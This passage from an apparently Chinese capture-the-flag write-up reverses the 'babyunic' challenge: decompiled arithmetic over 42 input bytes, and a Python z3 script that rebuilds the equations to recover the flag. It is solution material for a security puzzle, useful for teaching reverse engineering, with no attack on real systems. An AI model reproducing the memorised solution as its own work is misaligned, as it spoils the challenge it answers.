class="hljs-number">0x13</span>]) - (uint)param_1[<span class="hljs-number">0x14</span>]) +</span><br><span class="line">                           (uint)param_1[<span class="hljs-number">0x15</span>] + (uint)param_1[<span class="hljs-number">0x16</span>] + (uint)param_1[<span class="hljs-number">0x17</span>] +</span><br><span class="line">                          (uint)param_1[<span class="hljs-number">0x18</span>]) - (uint)param_1[<span class="hljs-number">0x19</span>]) + (uint)param_1[<span class="hljs-number">0x1a</span>]) -</span><br><span class="line">                       (uint)param_1[<span class="hljs-number">0x1b</span>]) + (uint)param_1[<span class="hljs-number">0x1c</span>] + (uint)param_1[<span class="hljs-number">0x1d</span>]) -</span><br><span class="line">                     (uint)param_1[<span class="hljs-number">0x1e</span>]) - (uint)param_1[<span class="hljs-number">0x1f</span>]) + (uint)param_1[<span class="hljs-number">0x20</span>]) -</span><br><span class="line">                  (uint)param_1[<span class="hljs-number">0x21</span>]) + (uint)param_1[<span class="hljs-number">0x22</span>] + (uint)param_1[<span class="hljs-number">0x23</span>]) -</span><br><span class="line">                (uint)param_1[<span class="hljs-number">0x24</span>]) - (uint)param_1[<span class="hljs-number">0x25</span>]) + (uint)param_1[<span class="hljs-number">0x26</span>]) -</span><br><span class="line">             (uint)param_1[<span class="hljs-number">0x27</span>]) + (uint)param_1[<span class="hljs-number">0x28</span>] + (uint)param_1[<span class="hljs-number">0x29</span>];</span><br><span class="line">  param_2[<span class="hljs-number">1</span>] = (((((((((((((((((((((((((((((((((((uint)*param_1 - (uint)param_1[<span class="hljs-number">1</span>]) +</span><br><span class="line">                                               (uint)param_1[<span class="hljs-number">2</span>]) - (uint)param_1[<span class="hljs-number">3</span>]) -</span><br><span class="line">                                             (uint)param_1[<span class="hljs-number">4</span>]) + (uint)param_1[<span class="hljs-number">5</span>]) -</span><br><span class="line">                                           (uint)param_1[<span class="hljs-number">6</span>]) - (uint)param_1[<span class="hljs-number">7</span>]) - (uint)param_1[<span class="hljs-number">8</span>])</span><br><span class="line">                                        - (uint)param_1[<span class="hljs-number">9</span>]) + (uint)param_1[<span class="hljs-number">10</span>]) -</span><br><span class="line">                                      (uint)param_1[<span class="hljs-number">0xb</span>]) + (uint)param_1[<span class="hljs-number">0xc</span>]) - (uint)param_1[<span class="hljs-number">0xd</span>]</span><br><span class="line">                                    ) - (uint)param_1[<span class="hljs-number">0xe</span>]) + (uint)param_1[<span class="hljs-number">0xf</span>]) -</span><br><span class="line">                                 (uint)param_1[<span class="hljs-number">0x10</span>]) - (uint)param_1[<span class="hljs-number">0x11</span>]) + (uint)param_1[<span class="hljs-number">0x12</span>])</span><br><span class="line">                              - (uint)param_1[<span class="hljs-number">0x13</span>]) + (uint)param_1[<span class="hljs-number">0x14</span>] + (uint)param_1[<span class="hljs-number">0x15</span>]) -</span><br><span class="line">                            (uint)param_1[<span class="hljs-number">0x16</span>]) - (uint)param_1[<span class="hljs-number">0x17</span>]) - (uint)param_1[<span class="hljs-number">0x18</span>]) +</span><br><span class="line">                         (uint)param_1[<span class="hljs-number">0x19</span>]) - (uint)param_1[<span class="hljs-number">0x1a</span>]) + (uint)param_1[<span class="hljs-number">0x1b</span>]) -</span><br><span class="line">                      (uint)param_1[<span class="hljs-number">0x1c</span>]) - (uint)param_1[<span class="hljs-number">0x1d</span>]) + (uint)param_1[<span class="hljs-number">0x1e</span>] +</span><br><span class="line">                     (uint)param_1[<span class="hljs-number">0x1f</span>] + (uint)param_1[<span class="hljs-number">0x20</span>] + (uint)param_1[<span class="hljs-number">0x21</span>] +</span><br><span class="line">                     (uint)param_1[<span class="hljs-number">0x22</span>] + (uint)param_1[<span class="hljs-number">0x23</span>]) - (uint)param_1[<span class="hljs-number">0x24</span>]) -</span><br><span class="line">                  (uint)param_1[<span class="hljs-number">0x25</span>]) - (uint)param_1[<span class="hljs-number">0x26</span>]) - (uint)param_1[<span class="hljs-number">0x27</span>]) -</span><br><span class="line">               (uint)param_1[<span class="hljs-number">0x28</span>]) + (uint)param_1[<span class="hljs-number">0x29</span>];</span><br><span class="line">  param_2[<span class="hljs-number">2</span>] = ((((((((((((((((((((((((((((((uint)*param_1 - (uint)param_1[<span class="hljs-number">1</span>]) + (uint)param_1[<span class="hljs-number">2</span>] +</span><br><span class="line"> ………………</span><br></pre></td></tr></tbody></table></figure><p>实在是太长了，就不放全了，可以看得出来<code>param_1</code>是我们的输入，经过一个处理之后用一系列复杂的方程计算出了<code>param_2</code></p><p>这个时候就要用<code>z3</code>一把梭解决问题了</p><p>首先对最终用于比较的字符进行一些处理</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">e = [<span class="hljs-number">0xFFFFFF94</span>, <span class="hljs-number">0xFFFFFF38</span>, <span class="hljs-number">0x00000126</span>, <span class="hljs-number">0xFFFFFF28</span>, <span class="hljs-number">0xFFFFFC10</span>, <span class="hljs-number">0x00000294</span>, <span class="hljs-number">0xFFFFFC9E</span>, <span class="hljs-number">0x000006EA</span>, <span class="hljs-number">0x000000DC</span>,</span><br><span class="line">     <span class="hljs-number">0x00000006</span>, <span class="hljs-number">0xFFFFFF0C</span>, <span class="hljs-number">0xFFFFFDF6</span>, <span class="hljs-number">0xFFFFFA82</span>, <span class="hljs-number">0xFFFFFCD0</span>, <span class="hljs-number">0x00000182</span>, <span class="hljs-number">0x000003DE</span>, <span class="hljs-number">0x0000014E</span>, <span class="hljs-number">0x000002B2</span>,</span><br><span class="line">     <span class="hljs-number">0xFFFFF8D8</span>, <span class="hljs-number">0x00000174</span>, <span class="hljs-number">0xFFFFFAA6</span>, <span class="hljs-number">0xFFFFF9D4</span>, <span class="hljs-number">0x000001C2</span>, <span class="hljs-number">0xFFFFF97C</span>, <span class="hljs-number">0x0000035A</span>, <span class="hljs-number">0x00000146</span>, <span class="hljs-number">0xFFFFFF3C</span>,</span><br><span class="line">     <span class="hljs-number">0xFFFFFA14</span>, <span class="hljs-number">0x000001CE</span>, <span class="hljs-number">0x000007DC</span>, <span class="hljs-number">0xFFFFFD48</span>, <span class="hljs-number">0x00000098</span>, <span class="hljs-number">0x0000085E</span>, <span class="hljs-number">0xFFFFFDB0</span>, <span class="hljs-number">0xFFFFFFBC</span>, <span class="hljs-number">0x0000036E</span>,</span><br><span class="line">     <span class="hljs-number">0xFFFFFF4E</span>, <span class="hljs-number">0xFFFFF836</span>, <span class="hljs-number">0x000005C0</span>, <span class="hljs-number">0x000006AE</span>, <span class="hljs-number">0x00000694</span>, <span class="hljs-number">0x00000022</span>]</span><br><span class="line">en = <span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x: ctypes.c_int32(x).value, e)</span><br><span class="line">enc = [z3.IntVal(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> en]</span><br></pre></td></tr></tbody></table></figure><p>在<code>babyunic</code>里是小端序存储，但是在<code>unicorn</code>里模拟的是32位大端序，需要进行一个转换，先是转换成大端序，然后转换成<code>c</code>的<code>int32</code>类型</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c = [Int(<span class="hljs-string">'c%d'</span> % i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">42</span>)]</span><br><span class="line">flag = []</span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> c:</span><br><span class="line">    solver.add(v &gt;= <span class="hljs-number">0x0</span>)</span><br><span class="line">    solver.add(v &lt;= <span class="hljs-number">0xff</span>)</span><br></pre></td></tr></tbody></table></figure><p>设定好符号，添加约束为<code>ascii</code>码值，然后添加方程的约束</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br></pre></td><td class="code"><pre><span class="line">solver.add(enc[<span class="hljs-number">0</span>] == (((((((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] + c[<span class="hljs-number">1</span>] + c[<span class="hljs-number">2</span>]) - c[<span class="hljs-number">3</span>]) + c[<span class="hljs-number">4</span>]) - c[<span class="hljs-number">5</span>]) - c[<span class="hljs-number">6</span>]) - c[<span class="hljs-number">7</span>]) - c[</span><br><span class="line">    <span class="hljs-number">8</span>]) + c[<span class="hljs-number">9</span>] + c[<span class="hljs-number">10</span>]) - c[<span class="hljs-number">0xb</span>]) + c[<span class="hljs-number">0xc</span>]) - c[<span class="hljs-number">0xd</span>]) - c[<span class="hljs-number">0xe</span>]) + c[<span class="hljs-number">0xf</span>]) - c[<span class="hljs-number">0x10</span>]) - c[<span class="hljs-number">0x11</span>]) + c[<span class="hljs-number">0x12</span>] + c[<span class="hljs-number">0x13</span>]) -</span><br><span class="line">                                    c[<span class="hljs-number">0x14</span>]) + c[<span class="hljs-number">0x15</span>] + c[<span class="hljs-number">0x16</span>] + c[<span class="hljs-number">0x17</span>] + c[<span class="hljs-number">0x18</span>]) - c[<span class="hljs-number">0x19</span>]) + c[<span class="hljs-number">0x1a</span>]) - c[<span class="hljs-number">0x1b</span>]) +</span><br><span class="line">                               c[<span class="hljs-number">0x1c</span>] + c[<span class="hljs-number">0x1d</span>]) - c[<span class="hljs-number">0x1e</span>]) - c[<span class="hljs-number">0x1f</span>]) + c[<span class="hljs-number">0x20</span>]) - c[<span class="hljs-number">0x21</span>]) + c[<span class="hljs-number">0x22</span>] + c[<span class="hljs-number">0x23</span>]) - c[</span><br><span class="line">                             <span class="hljs-number">0x24</span>]) - c[<span class="hljs-number">0x25</span>]) + c[<span class="hljs-number">0x26</span>]) - c[<span class="hljs-number">0x27</span>]) + c[<span class="hljs-number">0x28</span>] + c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">1</span>] == ((((((((((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] - c[<span class="hljs-number">1</span>]) + c[<span class="hljs-number">2</span>]) - c[<span class="hljs-number">3</span>]) - c[<span class="hljs-number">4</span>]) + c[<span class="hljs-number">5</span>]) - c[<span class="hljs-number">6</span>]) - c[<span class="hljs-number">7</span>]) - c[</span><br><span class="line">    <span class="hljs-number">8</span>]) - c[<span class="hljs-number">9</span>]) + c[<span class="hljs-number">10</span>]) - c[<span class="hljs-number">0xb</span>]) + c[<span class="hljs-number">0xc</span>]) - c[<span class="hljs-number">0xd</span>]) - c[<span class="hljs-number">0xe</span>]) + c[<span class="hljs-number">0xf</span>]) - c[<span class="hljs-number">0x10</span>]) - c[<span class="hljs-number">0x11</span>]) + c[<span class="hljs-number">0x12</span>]) - c[<span class="hljs-number">0x13</span>]) +</span><br><span class="line">                                    c[<span class="hljs-number">0x14</span>] + c[<span class="hljs-number">0x15</span>]) - c[<span class="hljs-number">0x16</span>]) - c[<span class="hljs-number">0x17</span>]) - c[<span class="hljs-number">0x18</span>]) + c[<span class="hljs-number">0x19</span>]) - c[<span class="hljs-number">0x1a</span>]) + c[</span><br><span class="line">                                  <span class="hljs-number">0x1b</span>]) - c[<span class="hljs-number">0x1c</span>]) - c[<span class="hljs-number">0x1d</span>]) + c[<span class="hljs-number">0x1e</span>] + c[<span class="hljs-number">0x1f</span>] + c[<span class="hljs-number">0x20</span>] + c[<span class="hljs-number">0x21</span>] + c[<span class="hljs-number">0x22</span>] + c[</span><br><span class="line">                               <span class="hljs-number">0x23</span>]) - c[<span class="hljs-number">0x24</span>]) - c[<span class="hljs-number">0x25</span>]) - c[<span class="hljs-number">0x26</span>]) - c[<span class="hljs-number">0x27</span>]) - c[<span class="hljs-number">0x28</span>]) + c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">2</span>] == (((((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] - c[<span class="hljs-number">1</span>]) + c[<span class="hljs-number">2</span>] + c[<span class="hljs-number">3</span>]) - c[<span class="hljs-number">4</span>]) + c[<span class="hljs-number">5</span>]) - c[<span class="hljs-number">6</span>]) - c[<span class="hljs-number">7</span>]) + c[<span class="hljs-number">8</span>]) -</span><br><span class="line">                                           c[<span class="hljs-number">9</span>]) - c[<span class="hljs-number">10</span>]) - c[<span class="hljs-number">0xb</span>]) - c[<span class="hljs-number">0xc</span>]) - c[<span class="hljs-number">0xd</span>]) + c[<span class="hljs-number">0xe</span>]) - c[<span class="hljs-number">0xf</span>]) - c[<span class="hljs-number">0x10</span>]) +</span><br><span class="line">                                   c[<span class="hljs-number">0x11</span>] + c[<span class="hljs-number">0x12</span>] + c[<span class="hljs-number">0x13</span>] + c[<span class="hljs-number">0x14</span>] + c[<span class="hljs-number">0x15</span>]) - c[<span class="hljs-number">0x16</span>]) + c[<span class="hljs-number">0x17</span>] + c[<span class="hljs-number">0x18</span>] + c[</span><br><span class="line">                                     <span class="hljs-number">0x19</span>] + c[<span class="hljs-number">0x1a</span>]) - c[<span class="hljs-number">0x1b</span>]) + c[<span class="hljs-number">0x1c</span>]) - c[<span class="hljs-number">0x1d</span>]) + c[<span class="hljs-number">0x1e</span>]) - c[<span class="hljs-number">0x1f</span>]) + c[<span class="hljs-number">0x20</span>] +</span><br><span class="line">                           c[<span class="hljs-number">0x21</span>]) - c[<span class="hljs-number">0x22</span>]) - c[<span class="hljs-number">0x23</span>]) + c[<span class="hljs-number">0x24</span>] + c[<span class="hljs-number">0x25</span>] + c[<span class="hljs-number">0x26</span>]) - c[<span class="hljs-number">0x27</span>]) + c[<span class="hljs-number">0x28</span>]) - c[</span><br><span class="line">               <span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">3</span>] == (((((((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] - c[<span class="hljs-number">1</span>]) - c[<span class="hljs-number">2</span>]) - c[<span class="hljs-number">3</span>]) - c[<span class="hljs-number">4</span>]) - c[<span class="hljs-number">5</span>]) + c[<span class="hljs-number">6</span>] + c[<span class="hljs-number">7</span>]) - c[</span><br><span class="line">    <span class="hljs-number">8</span>]) - c[<span class="hljs-number">9</span>]) - c[<span class="hljs-number">10</span>]) - c[<span class="hljs-number">0xb</span>]) + c[<span class="hljs-number">0xc</span>]) - c[<span class="hljs-number">0xd</span>]) + c[<span class="hljs-number">0xe</span>]) - c[<span class="hljs-number">0xf</span>]) + c[<span class="hljs-number">0x10</span>]) - c[<span class="hljs-number">0x11</span>]) + c[<span class="hljs-number">0x12</span>] + c[<span class="hljs-number">0x13</span>] +</span><br><span class="line">                                    c[<span class="hljs-number">0x14</span>]) - c[<span class="hljs-number">0x15</span>]) + c[<span class="hljs-number">0x16</span>] + c[<span class="hljs-number">0x17</span>] + c[<span class="hljs-number">0x18</span>]) - c[<span class="hljs-number">0x19</span>]) - c[<span class="hljs-number">0x1a</span>]) + c[</span><br><span class="line">                                   <span class="hljs-number">0x1b</span>]) - c[<span class="hljs-number">0x1c</span>]) + c[<span class="hljs-number">0x1d</span>] + c[<span class="hljs-number">0x1e</span>]) - c[<span class="hljs-number">0x1f</span>]) - c[<span class="hljs-number">0x20</span>]) - c[<span class="hljs-number">0x21</span>]) + c[<span class="hljs-number">0x22</span>]) -</span><br><span class="line">                        c[<span class="hljs-number">0x23</span>]) + c[<span class="hljs-number">0x24</span>] + c[<span class="hljs-number">0x25</span>] + c[<span class="hljs-number">0x26</span>]) - c[<span class="hljs-number">0x27</span>]) + c[<span class="hljs-number">0x28</span>] + c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">4</span>] == (((((((((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] - c[<span class="hljs-number">1</span>]) - c[<span class="hljs-number">2</span>]) + c[<span class="hljs-number">3</span>]) - c[<span class="hljs-number">4</span>]) - c[<span class="hljs-number">5</span>]) + c[<span class="hljs-number">6</span>] + c[<span class="hljs-number">7</span>] + c[</span><br><span class="line">    <span class="hljs-number">8</span>] + c[<span class="hljs-number">9</span>]) - c[<span class="hljs-number">10</span>]) + c[<span class="hljs-number">0xb</span>] + c[<span class="hljs-number">0xc</span>]) - c[<span class="hljs-number">0xd</span>]) + c[<span class="hljs-number">0xe</span>]) - c[<span class="hljs-number">0xf</span>]) + c[<span class="hljs-number">0x10</span>] + c[<span class="hljs-number">0x11</span>]) - c[<span class="hljs-number">0x12</span>]) + c[<span class="hljs-number">0x13</span>]) - c[</span><br><span class="line">                                            <span class="hljs-number">0x14</span>]) + c[<span class="hljs-number">0x15</span>]) - c[<span class="hljs-number">0x16</span>]) - c[<span class="hljs-number">0x17</span>]) - c[<span class="hljs-number">0x18</span>]) + c[<span class="hljs-number">0x19</span>]) - c[<span class="hljs-number">0x1a</span>]) -</span><br><span class="line">                                 c[<span class="hljs-number">0x1b</span>]) - c[<span class="hljs-number">0x1c</span>]) + c[<span class="hljs-number">0x1d</span>] + c[<span class="hljs-number">0x1e</span>] + c[<span class="hljs-number">0x1f</span>]) - c[<span class="hljs-number">0x20</span>]) + c[<span class="hljs-number">0x21</span>]) - c[<span class="hljs-number">0x22</span>]) -</span><br><span class="line">                           c[<span class="hljs-number">0x23</span>]) + c[<span class="hljs-number">0x24</span>]) - c[<span class="hljs-number">0x25</span>]) + c[<span class="hljs-number">0x26</span>]) - c[<span class="hljs-number">0x27</span>]) - c[<span class="hljs-number">0x28</span>]) - c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">5</span>] == ((((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] + c[<span class="hljs-number">1</span>] + c[<span class="hljs-number">2</span>] + c[<span class="hljs-number">3</span>] + c[<span class="hljs-number">4</span>] + c[<span class="hljs-number">5</span>] + c[<span class="hljs-number">6</span>] + c[<span class="hljs-number">7</span>] + c[<span class="hljs-number">8</span>]) - c[<span class="hljs-number">9</span>]) -</span><br><span class="line">                                               c[<span class="hljs-number">10</span>]) - c[<span class="hljs-number">0xb</span>]) - c[<span class="hljs-number">0xc</span>]) - c[<span class="hljs-number">0xd</span>]) - c[<span class="hljs-number">0xe</span>]) + c[<span class="hljs-number">0xf</span>]) - c[<span class="hljs-number">0x10</span>]) + c[</span><br><span class="line">                                            <span class="hljs-number">0x11</span>]) - c[<span class="hljs-number">0x12</span>]) + c[<span class="hljs-number">0x13</span>] + c[<span class="hljs-number">0x14</span>]) - c[<span class="hljs-number">0x15</span>]) + c[<span class="hljs-number">0x16</span>]) - c[<span class="hljs-number">0x17</span>]) + c[</span><br><span class="line">                                      <span class="hljs-number">0x18</span>]) - c[<span class="hljs-number">0x19</span>]) + c[<span class="hljs-number">0x1a</span>] + c[<span class="hljs-number">0x1b</span>]) - c[<span class="hljs-number">0x1c</span>]) + c[<span class="hljs-number">0x1d</span>]) - c[<span class="hljs-number">0x1e</span>]) + c[</span><br><span class="line">                                <span class="hljs-number">0x1f</span>] + c[<span class="hljs-number">0x20</span>] + c[<span class="hljs-number">0x21</span>]) - c[<span class="hljs-number">0x22</span>]) - c[<span class="hljs-number">0x23</span>]) - c[<span class="hljs-number">0x24</span>]) + c[<span class="hljs-number">0x25</span>]) - c[<span class="hljs-number">0x26</span>]) - c[</span><br><span class="line">                          <span class="hljs-number">0x27</span>]) + c[<span class="hljs-number">0x28</span>] + c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">6</span>] == (((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] - c[<span class="hljs-number">1</span>]) + c[<span class="hljs-number">2</span>] + c[<span class="hljs-number">3</span>] + c[<span class="hljs-number">4</span>]) - c[<span class="hljs-number">5</span>]) + c[<span class="hljs-number">6</span>] + c[<span class="hljs-number">7</span>] + c[<span class="hljs-number">8</span>] + c[</span><br><span class="line">    <span class="hljs-number">9</span>]) - c[<span class="hljs-number">10</span>]) + c[<span class="hljs-number">0xb</span>] + c[<span class="hljs-number">0xc</span>]) - c[<span class="hljs-number">0xd</span>]) + c[<span class="hljs-number">0xe</span>] + c[<span class="hljs-number">0xf</span>] + c[<span class="hljs-number">0x10</span>] + c[<span class="hljs-number">0x11</span>]) - c[<span class="hljs-number">0x12</span>]) - c[<span class="hljs-number">0x13</span>]) - c[<span class="hljs-number">0x14</span>]) -</span><br><span class="line">                                     c[<span class="hljs-number">0x15</span>]) - c[<span class="hljs-number">0x16</span>]) - c[<span class="hljs-number">0x17</span>]) + c[<span class="hljs-number">0x18</span>] + c[<span class="hljs-number">0x19</span>]) - c[<span class="hljs-number">0x1a</span>]) + c[<span class="hljs-number">0x1b</span>] + c[</span><br><span class="line">                                    <span class="hljs-number">0x1c</span>] + c[<span class="hljs-number">0x1d</span>]) - c[<span class="hljs-number">0x1e</span>]) - c[<span class="hljs-number">0x1f</span>]) - c[<span class="hljs-number">0x20</span>]) - c[<span class="hljs-number">0x21</span>]) - c[<span class="hljs-number">0x22</span>]) - c[<span class="hljs-number">0x23</span>]) +</span><br><span class="line">                         c[<span class="hljs-number">0x24</span>] + c[<span class="hljs-number">0x25</span>]) - c[<span class="hljs-number">0x26</span>]) - c[<span class="hljs-number">0x27</span>]) + c[<span class="hljs-number">0x28</span>]) - c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">7</span>] == ((((((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] + c[<span class="hljs-number">1</span>]) - c[<span class="hljs-number">2</span>]) - c[<span class="hljs-number">3</span>]) - c[<span class="hljs-number">4</span>]) + c[<span class="hljs-number">5</span>] + c[<span class="hljs-number">6</span>]) - c[<span class="hljs-number">7</span>]) + c[<span class="hljs-number">8</span>] +</span><br><span class="line">                                             c[<span class="hljs-number">9</span>]) - c[<span class="hljs-number">10</span>]) + c[<span class="hljs-number">0xb</span>]) - c[<span class="hljs-number">0xc</span>]) + c[<span class="hljs-number">0xd</span>]) - c[<span class="hljs-number">0xe</span>]) + c[<span class="hljs-number">0xf</span>]) - c[</span><br><span class="line">                                          <span class="hljs-number">0x10</span>]) + c[<span class="hljs-number">0x11</span>]) - c[<span class="hljs-number">0x12</span>]) - c[<span class="hljs-number">0x13</span>]) + c[<span class="hljs-number">0x14</span>]) - c[<span class="hljs-number">0x15</span>]) + c[<span class="hljs-number">0x16</span>]) - c[</span><br><span class="line">                                   <span class="hljs-number">0x17</span>]) - c[<span class="hljs-number">0x18</span>]) + c[<span class="hljs-number">0x19</span>]) - c[<span class="hljs-number">0x1a</span>]) + c[<span class="hljs-number">0x1b</span>] + c[<span class="hljs-number">0x1c</span>] + c[<span class="hljs-number">0x1d</span>] + c[<span class="hljs-number">0x1e</span>] + c[</span><br><span class="line">                               <span class="hljs-number">0x1f</span>] + c[<span class="hljs-number">0x20</span>]) - c[<span class="hljs-number">0x21</span>]) + c[<span class="hljs-number">0x22</span>]) - c[<span class="hljs-number">0x23</span>]) + c[<span class="hljs-number">0x24</span>] + c[<span class="hljs-number">0x25</span>] + c[<span class="hljs-number">0x26</span>] + c[</span><br><span class="line">                           <span class="hljs-number">0x27</span>]) - c[<span class="hljs-number">0x28</span>]) - c[<span class="hljs-number">0x29</span>])</span><br><span class="line"></span><br><span class="line">solver.add(enc[<span class="hljs-number">8</span>] == (((((((((((((((((((((((((((((c[<span class="hljs-number">0</span>] - c[<span class="hljs-number">1</span>]) - c[<span 